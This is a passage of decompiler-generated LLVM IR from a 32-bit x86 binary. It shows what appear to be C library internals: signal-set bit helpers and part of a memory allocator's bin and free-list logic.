  %v2_805173e = call i32 @function_805312b(i32 14, i32 %v2_8051737)
  ret i32 %v2_805173e

; uselistorder directives
  uselistorder i32* %stack_var_-20, { 1, 0 }
}

define i32 @function_8051747(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_8051747:
  %stack_var_-12 = alloca i32, align 4
  store i32 %arg1, i32* %stack_var_-12, align 4
  %v2_8051762 = ptrtoint i32* %stack_var_-12 to i32
  %v2_8051769 = call i32 @function_805312b(i32 1, i32 %v2_8051762)
  ret i32 %v2_8051769

; uselistorder directives
  uselistorder i32* %stack_var_-12, { 1, 0 }
  uselistorder i32 (i32, i32)* @function_805312b, { 5, 10, 4, 6, 3, 2, 9, 1, 7, 0, 8 }
}

define i32 @function_8051772(i32 %arg1) local_unnamed_addr {
dec_label_pc_8051772:
  %tmp3 = icmp slt i32 %arg1, 1
  br i1 %tmp3, label %dec_label_pc_805178a, label %dec_label_pc_805177d

dec_label_pc_805177d:                             ; preds = %dec_label_pc_8051772
  %v1_805177d = add i32 %arg1, -64
  %v3_805177d = sub i32 63, %arg1
  %v4_805177d = and i32 %v3_805177d, %arg1
  %v5_805177d = icmp slt i32 %v4_805177d, 0
  %v6_805177d = icmp eq i32 %v1_805177d, 0
  %v7_805177d = icmp slt i32 %v1_805177d, 0
  %v3_8051780 = icmp eq i1 %v7_805177d, %v5_805177d
  %v4_8051780 = icmp eq i1 %v6_805177d, false
  %v5_8051780 = and i1 %v4_8051780, %v3_8051780
  br i1 %v5_8051780, label %dec_label_pc_805178a, label %dec_label_pc_8051782

dec_label_pc_8051782:                             ; preds = %dec_label_pc_805177d
  %v4_8051785 = call i32 @function_8051888(i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_805178a

dec_label_pc_805178a:                             ; preds = %dec_label_pc_805177d, %dec_label_pc_8051772, %dec_label_pc_8051782
  %v1_805178a = call i32 @function_805149b(i32 ptrtoint (i32* @0 to i32))
  %v1_805178f = inttoptr i32 %v1_805178a to i32*
  store i32 22, i32* %v1_805178f, align 4
  ret i32 -1

; uselistorder directives
  uselistorder i32 %v1_805177d, { 1, 0 }
  uselistorder i32 %arg1, { 0, 3, 2, 1 }
  uselistorder label %dec_label_pc_805178a, { 2, 0, 1 }
}

define i32 @function_805179c(i32 %arg1) local_unnamed_addr {
dec_label_pc_805179c:
  %v3_80517aa = inttoptr i32 %arg1 to i8*
  %v4_80517aa = call i32 @function_80514ec(i8* %v3_80517aa, i32 0, i32 128)
  ret i32 0
}

define i32 @function_80517b5(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_80517b5:
  %eax.global-to-local = alloca i32, align 4
  %stack_var_-144 = alloca i32, align 4
  %stack_var_-284 = alloca i32, align 4
  %stack_var_-140 = alloca i32, align 4
  %stack_var_-300 = alloca i32, align 4
  %v0_80517b5 = load i32, i32* @ebx, align 4
  store i32 %arg2, i32* %eax.global-to-local, align 4
  store i32 %arg1, i32* @ebx, align 4
  %v10_80517ca = icmp eq i32 %arg2, -1
  %arg1.off = add i32 %arg1, -1
  %tmp35 = icmp ugt i32 %arg1.off, 63
  %tmp36 = or i1 %tmp35, %v10_80517ca
  br i1 %tmp36, label %dec_label_pc_80517d8, label %dec_label_pc_80517f3.lr.ph

dec_label_pc_80517d8:                             ; preds = %dec_label_pc_80517b5
  %v1_80517d8 = call i32 @function_805149b(i32 %v0_80517b5)
  store i32 %v1_80517d8, i32* %eax.global-to-local, align 4
  %v1_80517dd = inttoptr i32 %v1_80517d8 to i32*
  store i32 22, i32* %v1_80517dd, align 4
  br label %dec_label_pc_805185c

dec_label_pc_80517f3.lr.ph:                       ; preds = %dec_label_pc_80517b5
  %v15_80517b6 = ptrtoint i32* %stack_var_-300 to i32
  store i32 %arg2, i32* %stack_var_-144, align 4
  store i32 31, i32* %eax.global-to-local, align 4
  %v4_80517f328 = add i32 %v15_80517b6, 284
  %v5_80517f329 = inttoptr i32 %v4_80517f328 to i32*
  store i32 0, i32* %v5_80517f329, align 4
  %v0_80517fe30 = load i32, i32* %eax.global-to-local, align 4
  %v1_80517fe31 = add i32 %v0_80517fe30, -1
  %v9_80517fe32 = icmp slt i32 %v1_80517fe31, 0
  store i32 %v1_80517fe31, i32* %eax.global-to-local, align 4
  %v1_80517ff33 = icmp eq i1 %v9_80517fe32, false
  br i1 %v1_80517ff33, label %dec_label_pc_80517f3.dec_label_pc_80517f3_crit_edge, label %dec_label_pc_8051801

dec_label_pc_80517f3.dec_label_pc_80517f3_crit_edge: ; preds = %dec_label_pc_80517f3.lr.ph, %dec_label_pc_80517f3.dec_label_pc_80517f3_crit_edge
  %v1_80517fe34 = phi i32 [ %v1_80517fe, %dec_label_pc_80517f3.dec_label_pc_80517f3_crit_edge ], [ %v1_80517fe31, %dec_label_pc_80517f3.lr.ph ]
  %v0_80517f3.pre = load i32, i32* @esp, align 4
  %v2_80517f3 = mul i32 %v1_80517fe34, 4
  %v3_80517f3 = add i32 %v0_80517f3.pre, 160
  %v4_80517f3 = add i32 %v3_80517f3, %v2_80517f3
  %v5_80517f3 = inttoptr i32 %v4_80517f3 to i32*
  store i32 0, i32* %v5_80517f3, align 4
  %v0_80517fe = load i32, i32* %eax.global-to-local, align 4
  %v1_80517fe = add i32 %v0_80517fe, -1
  %v9_80517fe = icmp slt i32 %v1_80517fe, 0
  store i32 %v1_80517fe, i32* %eax.global-to-local, align 4
  %v1_80517ff = icmp eq i1 %v9_80517fe, false
  br i1 %v1_80517ff, label %dec_label_pc_80517f3.dec_label_pc_80517f3_crit_edge, label %dec_label_pc_8051801

dec_label_pc_8051801:                             ; preds = %dec_label_pc_80517f3.dec_label_pc_80517f3_crit_edge, %dec_label_pc_80517f3.lr.ph
  %v0_8051801 = load i32, i32* @edx, align 4
  %v2_8051804 = ptrtoint i32* %stack_var_-140 to i32
  store i32 %v2_8051804, i32* %eax.global-to-local, align 4
  %v4_805180c = call i32 @function_8051888(i32 %v2_8051804, i32 %arg1, i32 %v0_8051801, i32 %v0_8051801)
  store i32 %v4_805180c, i32* %eax.global-to-local, align 4
  %v2_8051814 = icmp slt i32 %v4_805180c, 0
  br i1 %v2_8051814, label %dec_label_pc_805185c, label %dec_label_pc_8051818

dec_label_pc_8051818:                             ; preds = %dec_label_pc_8051801
  %v4_8051820 = call i32 @function_8051864(i32 ptrtoint (i32* @global_var_80552a0.30 to i32), i32 %arg1, i32 %v4_805180c, i32 %v4_805180c)
  %v2_8051839 = ptrtoint i32* %stack_var_-284 to i32
  %v2_805183e = ptrtoint i32* %stack_var_-144 to i32
  store i32 %v2_805183e, i32* %eax.global-to-local, align 4
  %v4_8051847 = call i32 @function_8053037(i32 %arg1, i32* nonnull %stack_var_-144, i32 %v2_8051839)
  store i32 %v4_8051847, i32* %eax.global-to-local, align 4
  %v2_805184f = icmp slt i32 %v4_8051847, 0
  %v3_8051853 = load i32, i32* %stack_var_-284, align 4
  %.v3_8051853 = select i1 %v2_805184f, i32 -1, i32 %v3_8051853
  br label %dec_label_pc_805185c

dec_label_pc_805185c:                             ; preds = %dec_label_pc_8051818, %dec_label_pc_80517d8, %dec_label_pc_8051801
  %storemerge = phi i32 [ -1, %dec_label_pc_8051801 ], [ -1, %dec_label_pc_80517d8 ], [ %.v3_8051853, %dec_label_pc_8051818 ]
  store i32 %storemerge, i32* %eax.global-to-local, align 4
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v1_80517fe, { 2, 1, 0 }
  uselistorder i32* %stack_var_-144, { 0, 2, 1 }
  uselistorder i32* %eax.global-to-local, { 7, 0, 1, 2, 3, 4, 10, 11, 8, 9, 5, 6 }
  uselistorder i32 160, { 1, 0 }
  uselistorder i32 284, { 0, 4, 5, 6, 7, 1, 2, 3, 8, 9 }
  uselistorder i32 %arg2, { 1, 0, 2 }
  uselistorder i32 %arg1, { 2, 3, 1, 0, 4 }
  uselistorder label %dec_label_pc_805185c, { 0, 2, 1 }
  uselistorder label %dec_label_pc_80517f3.dec_label_pc_80517f3_crit_edge, { 1, 0 }
}

define i32 @function_8051864(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_8051864:
  %v1_8051872 = add i32 %arg2, -1
  %v1_8051875 = urem i32 %v1_8051872, 32
  %v2_8051875 = icmp eq i32 %v1_8051875, 0
  %v2_8051878 = udiv i32 %v1_8051872, 32
  br i1 %v2_8051875, label %bb5, label %bb

bb:                                               ; preds = %dec_label_pc_8051864
  %v5_805187b = shl i32 1, %v1_8051875
  br label %bb5

bb5:                                              ; preds = %dec_label_pc_8051864, %bb
  %v6_805187d = phi i32 [ 1, %dec_label_pc_8051864 ], [ %v5_805187b, %bb ]
  %v2_805187d = mul nuw nsw i32 %v2_8051878, 4
  %v3_805187d = add i32 %v2_805187d, %arg1
  %v4_805187d = inttoptr i32 %v3_805187d to i32*
  %v5_805187d = load i32, i32* %v4_805187d, align 4
  %v7_805187d = and i32 %v5_805187d, %v6_805187d
  %v8_805187d = icmp eq i32 %v7_805187d, 0
  %v1_8051881 = icmp eq i1 %v8_805187d, false
  %v2_8051881 = zext i1 %v1_8051881 to i32
  ret i32 %v2_8051881

; uselistorder directives
  uselistorder i32 %v1_8051875, { 1, 0 }
  uselistorder label %bb5, { 1, 0 }
}

define i32 @function_8051888(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_8051888:
  %stack_var_-4 = alloca i32, align 4
  %v0_8051888 = load i32, i32* @ebx, align 4
  store i32 %v0_8051888, i32* %stack_var_-4, align 4
  %v1_8051896 = add i32 %arg2, -1
  %v1_8051899 = urem i32 %v1_8051896, 32
  %v2_8051899 = icmp eq i32 %v1_8051899, 0
  store i32 %v1_8051899, i32* @ecx, align 4
  %v2_805189c = udiv i32 %v1_8051896, 32
  store i32 %v2_805189c, i32* @edx, align 4
  br i1 %v2_8051899, label %bb5, label %bb

bb:                                               ; preds = %dec_label_pc_8051888
  %v5_805189f = shl i32 1, %v1_8051899
  br label %bb5

bb5:                                              ; preds = %dec_label_pc_8051888, %bb
  %v6_80518a1 = phi i32 [ 1, %dec_label_pc_8051888 ], [ %v5_805189f, %bb ]
  %v2_80518a1 = mul nuw nsw i32 %v2_805189c, 4
  %v3_80518a1 = add i32 %v2_80518a1, %arg1
  %v4_80518a1 = inttoptr i32 %v3_80518a1 to i32*
  %v5_80518a1 = load i32, i32* %v4_80518a1, align 4
  %v7_80518a1 = or i32 %v5_80518a1, %v6_80518a1
  store i32 %v7_80518a1, i32* %v4_80518a1, align 4
  %v2_80518a6 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_80518a6, i32* @ebx, align 4
  ret i32 0

; uselistorder directives
  uselistorder i32 %v2_805189c, { 1, 0 }
  uselistorder i32 %v1_8051899, { 2, 1, 0 }
  uselistorder label %bb5, { 1, 0 }
}

define i32 @function_80518a8() local_unnamed_addr {
dec_label_pc_80518a8:
  %v0_80518a8 = load i32, i32* @eax, align 4
  %v6_80518bb = icmp ugt i32 %v0_80518a8, 16777215
  br i1 %v6_80518bb, label %dec_label_pc_80518cc, label %dec_label_pc_80518bd

dec_label_pc_80518bd:                             ; preds = %dec_label_pc_80518a8
  %v2_80518ab = udiv i32 %v0_80518a8, 256
  %tmp = icmp ult i32 %v0_80518a8, 256
  %v2_80518bd = call i32 @llvm.ctlz.i32(i32 %v2_80518ab, i1 true)
  %v3_80518bd = xor i32 %v2_80518bd, 31
  %v5_80518bd = select i1 %tmp, i32 95, i32 %v3_80518bd
  %v1_80518c0 = add nuw nsw i32 %v5_80518bd, 6
  %v2_80518c3 = urem i32 %v1_80518c0, 32
  %v4_80518c3 = icmp eq i32 %v2_80518c3, 0
  br i1 %v4_80518c3, label %bb4, label %bb

bb:                                               ; preds = %dec_label_pc_80518bd
  %v5_80518c3 = lshr i32 %v0_80518a8, %v2_80518c3
  br label %bb4

bb4:                                              ; preds = %dec_label_pc_80518bd, %bb
  %v0_80518c5 = phi i32 [ %v0_80518a8, %dec_label_pc_80518bd ], [ %v5_80518c3, %bb ]
  %v1_80518c5 = urem i32 %v0_80518c5, 4
  %v2_80518c8 = mul nuw nsw i32 %v5_80518bd, 4
  %v3_80518c8 = or i32 %v1_80518c5, 32
  %v4_80518c8 = add nuw nsw i32 %v3_80518c8, %v2_80518c8
  br label %dec_label_pc_80518cc

dec_label_pc_80518cc:                             ; preds = %dec_label_pc_80518a8, %bb4
  %v0_80518cd = phi i32 [ 95, %dec_label_pc_80518a8 ], [ %v4_80518c8, %bb4 ]
  ret i32 %v0_80518cd

; uselistorder directives
  uselistorder i32 %v2_80518c3, { 1, 0 }
  uselistorder i32 %v0_80518a8, { 2, 3, 0, 1, 4 }
  uselistorder i1 true, { 15, 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14 }
  uselistorder label %dec_label_pc_80518cc, { 1, 0 }
  uselistorder label %bb4, { 1, 0 }
}

define i32 @function_80518ce(i32 %arg1) local_unnamed_addr {
dec_label_pc_80518ce:
  %eax.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %ecx.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %stack_var_-92 = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v0_80518ce = load i32, i32* @ebp, align 4
  %v0_80518cf = load i32, i32* @edi, align 4
  %v0_80518d0 = load i32, i32* @esi, align 4
  %v0_80518d1 = load i32, i32* @ebx, align 4
  store i32 %v0_80518d1, i32* %stack_var_-16, align 4
  store i32 %arg1, i32* %ebx.global-to-local, align 4
  %v2_80518e3 = ptrtoint i32* %stack_var_-32 to i32
  store i32 %v2_80518e3, i32* @eax, align 4
  store i32 %v2_80518e3, i32* %stack_var_-92, align 4
  %v2_80518e8 = call i32 @function_8052dfa(i32 %v2_80518e3, i32 134557175)
  store i32 %v2_80518e8, i32* %eax.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_805503c.31 to i32), i32* %stack_var_-92, align 4
  %v1_80518f4 = call i32 @function_8052df7(i32 ptrtoint (i32* @global_var_805503c.31 to i32))
  store i32 %v1_80518f4, i32* %eax.global-to-local, align 4
  %v0_80518fc = load i32, i32* %ebx.global-to-local, align 4
  %tmp123 = icmp ult i32 %v0_80518fc, -32
  br i1 %tmp123, label %dec_label_pc_8051913, label %dec_label_pc_8051901

dec_label_pc_8051901:                             ; preds = %dec_label_pc_80518ce
  %v0_8051901 = load i32, i32* %stack_var_-92, align 4
  %v1_8051901 = call i32 @function_805149b(i32 %v0_8051901)
  store i32 %v1_8051901, i32* %eax.global-to-local, align 4
  store i32 0, i32* %ebx.global-to-local, align 4
  %v1_8051908 = inttoptr i32 %v1_8051901 to i32*
  store i32 12, i32* %v1_8051908, align 4
  br label %dec_label_pc_8052038

dec_label_pc_8051913:                             ; preds = %dec_label_pc_80518ce
  %v1_8051913 = add i32 %v0_80518fc, 11
  %tmp124 = icmp ult i32 %v1_8051913, 16
  %v1_8051923 = and i32 %v1_8051913, -8
  %v1_8051913.v1_8051923 = select i1 %tmp124, i32 %v1_8051913, i32 %v1_8051923
  %.v1_8051923 = select i1 %tmp124, i32 16, i32 %v1_8051923
  store i32 %v1_8051913.v1_8051923, i32* %eax.global-to-local, align 4
  %v0_805192a = load i8, i8* @global_var_8055320.32, align 1
  %v1_805192a = sext i8 %v0_805192a to i32
  store i32 %v1_805192a, i32* @ebx, align 4
  %v3_8051930 = urem i8 %v0_805192a, 2
  %v4_8051930 = icmp eq i8 %v3_8051930, 0
  %v1_8051933 = icmp eq i1 %v4_8051930, false
  br i1 %v1_8051933, label %dec_label_pc_8051952, label %dec_label_pc_8051935

dec_label_pc_8051935:                             ; preds = %dec_label_pc_8051913
  %v2_8051935 = icmp eq i8 %v0_805192a, 0
  %v1_8051937 = icmp eq i1 %v2_8051935, false
  br i1 %v1_8051937, label %dec_label_pc_8051c2d, label %dec_label_pc_805193d

dec_label_pc_805193d:                             ; preds = %dec_label_pc_8051935
  store i32 ptrtoint (i8* @global_var_8055320.32 to i32), i32* %stack_var_-92, align 4
  %v2_8051945 = call i32 @function_80524eb(i32* bitcast (i8* @global_var_8055320.32 to i32*))
  store i32 %v2_8051945, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8051c2d

dec_label_pc_8051952:                             ; preds = %dec_label_pc_8051913
  %v11_8051952 = trunc i32 %.v1_8051923 to i8
  %v8_8051956 = icmp ugt i8 %v11_8051952, %v0_805192a
  br i1 %v8_8051956, label %dec_label_pc_8051973, label %dec_label_pc_8051958

dec_label_pc_8051958:                             ; preds = %dec_label_pc_8051952
  %v2_805195c = udiv i32 %.v1_8051923, 2
  store i32 %v2_805195c, i32* %eax.global-to-local, align 4
  %v1_805195e = add i32 %v2_805195c, ptrtoint (i8* @global_var_8055320.32 to i32)
  store i32 %v1_805195e, i32* %ecx.global-to-local, align 4
  %v1_8051964 = add i32 %v2_805195c, add (i32 ptrtoint (i8* @global_var_8055320.32 to i32), i32 -4)
  %v2_8051964 = inttoptr i32 %v1_8051964 to i32*
  %v3_8051964 = load i32, i32* %v2_8051964, align 4
  store i32 %v3_8051964, i32* @edx, align 4
  %v1_8051967 = icmp eq i32 %v3_8051964, 0
  br i1 %v1_8051967, label %dec_label_pc_8051973, label %dec_label_pc_805196b

dec_label_pc_805196b:                             ; preds = %dec_label_pc_8051958
  %v1_805196b = add i32 %v3_8051964, 8
  %v2_805196b = inttoptr i32 %v1_805196b to i32*
  %v3_805196b = load i32, i32* %v2_805196b, align 4
  store i32 %v3_805196b, i32* %eax.global-to-local, align 4
  store i32 %v3_805196b, i32* %v2_8051964, align 4
  br label %dec_label_pc_80519ac

dec_label_pc_8051973:                             ; preds = %dec_label_pc_8051958, %dec_label_pc_8051952
  %v8_8051973 = icmp ult i32 %.v1_8051923, 255
  %v6_805197b = icmp ugt i32 %.v1_8051923, 255
  store i32 %.v1_8051923, i32* @eax, align 4
  br i1 %v6_805197b, label %dec_label_pc_80519b4, label %dec_label_pc_805197d

dec_label_pc_805197d:                             ; preds = %dec_label_pc_8051973
  %v2_8051981 = udiv i32 %.v1_8051923, 8
  store i32 %v2_8051981, i32* %eax.global-to-local, align 4
  %v1_8051988 = mul nuw i32 %v2_8051981, 8
  %v2_8051988 = add i32 %v1_8051988, ptrtoint (i32* @global_var_805534c.33 to i32)
  store i32 %v2_8051988, i32* %ecx.global-to-local, align 4
  %v1_805198f = add i32 %v1_8051988, add (i32 ptrtoint (i32* @global_var_805534c.33 to i32), i32 12)
  %v2_805198f = inttoptr i32 %v1_805198f to i32*
  %v3_805198f = load i32, i32* %v2_805198f, align 4
  store i32 %v3_805198f, i32* @edx, align 4
  %v12_8051992 = icmp eq i32 %v3_805198f, %v2_8051988
  br i1 %v12_8051992, label %dec_label_pc_8051ab0.preheader, label %dec_label_pc_805199a

dec_label_pc_805199a:                             ; preds = %dec_label_pc_805197d
  store i32 %.v1_8051923, i32* %ebx.global-to-local, align 4
  %v1_805199e = add i32 %v3_805198f, 12
  %v2_805199e = inttoptr i32 %v1_805199e to i32*
  %v3_805199e = load i32, i32* %v2_805199e, align 4
  store i32 %v3_805199e, i32* %eax.global-to-local, align 4
  store i32 %v3_805199e, i32* %v2_805198f, align 4
  %v0_80519a4 = load i32, i32* @edx, align 4
  %v1_80519a4 = load i32, i32* %ebx.global-to-local, align 4
  %v2_80519a4 = add i32 %v0_80519a4, 4
  %v3_80519a4 = add i32 %v2_80519a4, %v1_80519a4
  %v4_80519a4 = inttoptr i32 %v3_80519a4 to i32*
  %v5_80519a4 = load i32, i32* %v4_80519a4, align 4
  %v6_80519a4 = or i32 %v5_80519a4, 1
  store i32 %v6_80519a4, i32* %v4_80519a4, align 4
  %v0_80519a9 = load i32, i32* %ecx.global-to-local, align 4
  %v1_80519a9 = load i32, i32* %eax.global-to-local, align 4
  %v2_80519a9 = add i32 %v1_80519a9, 8
  %v3_80519a9 = inttoptr i32 %v2_80519a9 to i32*
  store i32 %v0_80519a9, i32* %v3_80519a9, align 4
  br label %dec_label_pc_80519ac

dec_label_pc_80519ac:                             ; preds = %dec_label_pc_8051d49, %dec_label_pc_8051d5b, %dec_label_pc_805196b, %dec_label_pc_805199a
  %v0_80519ac = load i32, i32* @edx, align 4
  %v1_80519ac = add i32 %v0_80519ac, 8
  store i32 %v1_80519ac, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8052027

dec_label_pc_80519b4:                             ; preds = %dec_label_pc_8051973
  %v0_80519b8 = call i32 @function_80518a8()
  store i32 %v0_80519b8, i32* %eax.global-to-local, align 4
  %v3_80519bd = and i8 %v0_805192a, 2
  %v4_80519bd = icmp eq i8 %v3_80519bd, 0
  %v6_80519bd = zext i8 %v3_80519bd to i32
  %v9_80519bd = and i32 %v1_805192a, -256
  %v10_80519bd = or i32 %v9_80519bd, %v6_80519bd
  store i32 %v10_80519bd, i32* @ebx, align 4
  br i1 %v4_80519bd, label %dec_label_pc_8051ab0.preheader, label %dec_label_pc_80519ca

dec_label_pc_80519ca:                             ; preds = %dec_label_pc_80519b4
  store i32 ptrtoint (i8* @global_var_8055320.32 to i32), i32* %stack_var_-92, align 4
  %v2_80519d2 = call i32 @function_80524eb(i32* bitcast (i8* @global_var_8055320.32 to i32*))
  store i32 %v2_80519d2, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8051ab0.preheader

dec_label_pc_8051ab0.preheader:                   ; preds = %dec_label_pc_80519ca, %dec_label_pc_805197d, %dec_label_pc_80519b4
  %stack_var_-40.0.ph = phi i32 [ %v2_8051981, %dec_label_pc_805197d ], [ %v0_80519b8, %dec_label_pc_80519ca ], [ %v0_80519b8, %dec_label_pc_80519b4 ]
  %v0_8051ab09 = load i32, i32* @global_var_8055360.36, align 32
  store i32 %v0_8051ab09, i32* @ebp, align 4
  %v9_8051ab615 = icmp eq i32 %v0_8051ab09, 134566740
  %v1_8051abc17 = icmp eq i1 %v9_8051ab615, false
  br i1 %v1_8051abc17, label %dec_label_pc_80519df.lr.ph, label %dec_label_pc_8051ac2

dec_label_pc_80519df.lr.ph:                       ; preds = %dec_label_pc_8051ab0.preheader
  %v1_8051a06 = add i32 %.v1_8051923, 16
  br label %dec_label_pc_80519df

dec_label_pc_80519df:                             ; preds = %dec_label_pc_80519df.lr.ph, %dec_label_pc_8051ab0
  %v1_8051fd9 = phi i32 [ %v0_8051ab09, %dec_label_pc_80519df.lr.ph ], [ %v0_8051ab0, %dec_label_pc_8051ab0 ]
  %v1_80519df = add i32 %v1_8051fd9, 4
  %v2_80519df = inttoptr i32 %v1_80519df to i32*
  %v3_80519df = load i32, i32* %v2_80519df, align 4
  %v1_80519e2 = add i32 %v1_8051fd9, 12
  %v2_80519e2 = inttoptr i32 %v1_80519e2 to i32*
  %v3_80519e2 = load i32, i32* %v2_80519e2, align 4
  store i32 %v3_80519e2, i32* @edx, align 4
  %v1_80519e5 = and i32 %v3_80519df, -4
  store i32 %v1_80519e5, i32* @edi, align 4
  %v9_80519f2 = icmp eq i32 %v3_80519e2, 134566740
  %v1_80519f8 = icmp eq i1 %v9_80519f2, false
  %or.cond95 = or i1 %v6_805197b, %v1_80519f8
  br i1 %or.cond95, label %dec_label_pc_8051a11, label %dec_label_pc_80519fa

dec_label_pc_80519fa:                             ; preds = %dec_label_pc_80519df
  %v1_80519fa = load i32, i32* @global_var_8055350.34, align 16
  %v12_80519fa = icmp eq i32 %v1_8051fd9, %v1_80519fa
  %v1_8051a00 = icmp eq i1 %v12_80519fa, false
  br i1 %v1_8051a00, label %dec_label_pc_8051a11, label %dec_label_pc_8051a02

dec_label_pc_8051a02:                             ; preds = %dec_label_pc_80519fa
  store i32 %v1_8051a06, i32* %eax.global-to-local, align 4
  %v6_8051a0b = icmp ugt i32 %v1_80519e5, %v1_8051a06
  br i1 %v6_8051a0b, label %dec_label_pc_8051fc2, label %dec_label_pc_8051a11

dec_label_pc_8051a11:                             ; preds = %dec_label_pc_8051a02, %dec_label_pc_80519fa, %dec_label_pc_80519df
  store i32 ptrtoint (i32* @global_var_8055354.35 to i32), i32* %eax.global-to-local, align 4
  %v2_8051a16 = add i32 %v3_80519e2, 8
  %v3_8051a16 = inttoptr i32 %v2_8051a16 to i32*
  store i32 ptrtoint (i32* @global_var_8055354.35 to i32), i32* %v3_8051a16, align 4
  %v0_8051a19 = load i32, i32* @edx, align 4
  store i32 %v0_8051a19, i32* @global_var_8055360.36, align 4
  %v0_8051a1c = load i32, i32* @edi, align 4
  %v15_8051a1c = icmp eq i32 %v0_8051a1c, %.v1_8051923
  br i1 %v15_8051a1c, label %dec_label_pc_8052003, label %dec_label_pc_8051a26

dec_label_pc_8051a26:                             ; preds = %dec_label_pc_8051a11
  %v6_8051a2c = icmp ugt i32 %v0_8051a1c, 255
  br i1 %v6_8051a2c, label %dec_label_pc_8051a3f, label %dec_label_pc_8051a2e

dec_label_pc_8051a2e:                             ; preds = %dec_label_pc_8051a26
  %v2_8051a30 = udiv i32 %v0_8051a1c, 8
  store i32 %v2_8051a30, i32* %esi.global-to-local, align 4
  %v1_8051a33 = mul nuw i32 %v2_8051a30, 8
  %v2_8051a33 = add i32 %v1_8051a33, 134566732
  store i32 %v2_8051a33, i32* @ebx, align 4
  %v1_8051a3a = add i32 %v1_8051a33, 134566740
  %v2_8051a3a = inttoptr i32 %v1_8051a3a to i32*
  %v3_8051a3a = load i32, i32* %v2_8051a3a, align 4
  store i32 %v3_8051a3a, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8051a88

dec_label_pc_8051a3f:                             ; preds = %dec_label_pc_8051a26
  store i32 %v0_8051a1c, i32* @eax, align 4
  %v0_8051a41 = call i32 @function_80518a8()
  store i32 %v0_8051a41, i32* %esi.global-to-local, align 4
  %v1_8051a48 = mul i32 %v0_8051a41, 8
  %v2_8051a48 = add i32 %v1_8051a48, ptrtoint (i32* @global_var_805534c.33 to i32)
  store i32 %v2_8051a48, i32* %eax.global-to-local, align 4
  %v1_8051a4f = add i32 %v1_8051a48, add (i32 ptrtoint (i32* @global_var_805534c.33 to i32), i32 8)
  %v2_8051a4f = inttoptr i32 %v1_8051a4f to i32*
  %v3_8051a4f = load i32, i32* %v2_8051a4f, align 4
  store i32 %v3_8051a4f, i32* %edx.global-to-local, align 4
  store i32 %v3_8051a4f, i32* @ebx, align 4
  %v12_8051a58 = icmp eq i32 %v3_8051a4f, %v2_8051a48
  br i1 %v12_8051a58, label %dec_label_pc_8051a88, label %dec_label_pc_8051a5c

dec_label_pc_8051a5c:                             ; preds = %dec_label_pc_8051a3f
  %v1_8051a5c = add i32 %v1_8051a48, add (i32 ptrtoint (i32* @global_var_805534c.33 to i32), i32 12)
  %v2_8051a5c = inttoptr i32 %v1_8051a5c to i32*
  %v3_8051a5c = load i32, i32* %v2_8051a5c, align 4
  store i32 %v3_8051a5c, i32* @ebx, align 4
  %v0_8051a5f = load i32, i32* @edi, align 4
  %v2_8051a5f = add i32 %v3_8051a5c, 4
  %v3_8051a5f = inttoptr i32 %v2_8051a5f to i32*
  %v4_8051a5f = load i32, i32* %v3_8051a5f, align 4
  %v10_8051a5f = icmp ult i32 %v0_8051a5f, %v4_8051a5f
  %v1_8051a62 = icmp eq i1 %v10_8051a5f, false
  br i1 %v1_8051a62, label %dec_label_pc_8051a6a, label %dec_label_pc_8051a88

dec_label_pc_8051a6a:                             ; preds = %dec_label_pc_8051a5c
  %v1_8051a6c = or i32 %v0_8051a5f, 1
  store i32 %v1_8051a6c, i32* %eax.global-to-local, align 4
  store i32 %v3_8051a4f, i32* %ebx.global-to-local, align 4
  %v2_8051a80109 = add i32 %v3_8051a4f, 4
  %v3_8051a80110 = inttoptr i32 %v2_8051a80109 to i32*
  %v4_8051a80111 = load i32, i32* %v3_8051a80110, align 4
  %v10_8051a80112 = icmp ult i32 %v1_8051a6c, %v4_8051a80111
  br i1 %v10_8051a80112, label %dec_label_pc_8051a71, label %dec_label_pc_8051a85

dec_label_pc_8051a71:                             ; preds = %dec_label_pc_8051a6a, %dec_label_pc_8051a71
  %v0_8051a85113 = phi i32 [ %v3_8051a75, %dec_label_pc_8051a71 ], [ %v3_8051a4f, %dec_label_pc_8051a6a ]
  store i32 %v0_8051a85113, i32* %ecx.global-to-local, align 4
  %v1_8051a75 = add i32 %v0_8051a85113, 8
  %v2_8051a75 = inttoptr i32 %v1_8051a75 to i32*
  %v3_8051a75 = load i32, i32* %v2_8051a75, align 4
  store i32 %v3_8051a75, i32* %ecx.global-to-local, align 4
  store i32 %v3_8051a75, i32* %ebx.global-to-local, align 4
  %v2_8051a80 = add i32 %v3_8051a75, 4
  %v3_8051a80 = inttoptr i32 %v2_8051a80 to i32*
  %v4_8051a80 = load i32, i32* %v3_8051a80, align 4
  %v10_8051a80 = icmp ult i32 %v1_8051a6c, %v4_8051a80
  br i1 %v10_8051a80, label %dec_label_pc_8051a71, label %dec_label_pc_8051a85

dec_label_pc_8051a85:                             ; preds = %dec_label_pc_8051a71, %dec_label_pc_8051a6a
  %v0_8051a85.lcssa = phi i32 [ %v3_8051a4f, %dec_label_pc_8051a6a ], [ %v3_8051a75, %dec_label_pc_8051a71 ]
  %v1_8051a85 = add i32 %v0_8051a85.lcssa, 12
  %v2_8051a85 = inttoptr i32 %v1_8051a85 to i32*
  %v3_8051a85 = load i32, i32* %v2_8051a85, align 4
  store i32 %v3_8051a85, i32* @ebx, align 4
  br label %dec_label_pc_8051a88

